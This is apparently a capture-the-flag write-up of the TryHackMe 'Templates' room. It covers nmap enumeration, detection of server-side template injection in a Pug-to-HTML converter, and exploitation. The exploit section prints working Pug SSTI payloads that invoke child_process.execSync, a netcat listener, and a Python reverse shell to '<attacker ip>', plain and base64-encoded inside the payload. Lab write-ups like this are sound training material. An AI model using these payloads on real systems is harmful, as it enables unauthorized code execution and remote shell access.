---
layout: post
author: L0
---

# THM-Templates

![image](/images/Pasted image 20221031000528.png)

## Enumeration

### nmap

starting with nmap revealed a web server on port 5000 and `ssh` on port 22

```shell
$ nmap -A templates.thm
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-30 18:23 EDT
Nmap scan report for templates.thm (10.10.86.105)
Host is up (0.039s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 b2:e4:5d:b1:47:f7:58:7c:d9:ae:3f:a4:14:00:7d:e5 (RSA)
|   256 c9:cd:60:99:3f:c4:7a:59:f6:65:2f:0b:8a:c8:43:99 (ECDSA)
|_  256 62:1b:b2:c8:29:ca:84:d9:f0:aa:71:b3:e9:b9:53:21 (ED25519)
5000/tcp open  http    Node.js (Express middleware)
|_http-title: PUG to HTML
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

i looked at the web page and was greeted with a PUG to HTML Converter.

![image](/images/Pasted image 20221030235451.png)

after pushing the Button a raw conversion String was presented.

![image](/images/Pasted image 20221030235511.png)

after a quick research about PUG syntax i tried the confirmation of a possible SSTI.

![image](/images/Pasted image 20221030235552.png)

and what a surprise i go the correct answer back.

![image](/images/Pasted image 20221030235611.png)

## Exploit

now i had to find a way to get a shell onto this machine. again i googled a bit and stumbled across some interesting resources.

![image](/images/Pasted image 20221030235232.png)

`0xdbe` s ssti-express-pug was depends on tplmap. i followed the link and searched through the source code. 

![image](/images/Pasted image 20221030235322.png)

[tlpmap](https://github.com/epinna/tplmap/)

i found something in a file that belongs to exploiting the Pug template engine.

![image](/images/Pasted image 20221030235407.png)

before i could try the command i needed to encode my commands. in the next PoC i tried to execute `id` an the box.

![image](/images/Pasted image 20221030235718.png)

```shell
#{global.process.mainModule.require('child_process').execSync(Buffer('aWQ=', 'base64').toString())}
```

and it worked.

![image](/images/Pasted image 20221030235755.png)

the same command works also without base64 encoding, but you get a problem when you need to execute commands more complex and with more special symbols. so i sticked with encoding to base64

```shell
#{global.process.mainModule.require('child_process').execSync('id')}
```

before i tried to execute a reverse shell i started a listener on my kali box.

```shell
$ nc -lvnp 4444
```

this time i tried the python reverse shell

```shell
python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker ip>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

encoding to base64

```shell
cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxvcyxwdHk7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiPGF0dGFja2VyIGlwPiIsNDQ0NCkpO29zLmR1cDIocy5maWxlbm8oKSwwKTtvcy5kdXAyKHMuZmlsZW5vKCksMSk7b3MuZHVwMihzLmZpbGVubygpLDIpO3B0eS5zcGF3bigiL2Jpbi9zaCIpJwo=
```

and inserted it in the command

```input
#{global.process.mainModule.require('child_process').execSync(Buffer('cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxvcyxwdHk7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiPGF0dGFja2VyIGlwPiIsNDQ0NCkpO29zLmR1cDIocy5maWxlbm8oKSwwKTtvcy5kdXAyKHMuZmlsZW5vKCksMSk7b3MuZHVwMihzLmZpbGVubygpLDIpO3B0eS5zcGF3bigiL2Jpbi9zaCIpJwo=', 'base64').toString())}
```

the shell poped and i got my flag


![image](/images/Pasted image 20221031000354.png)

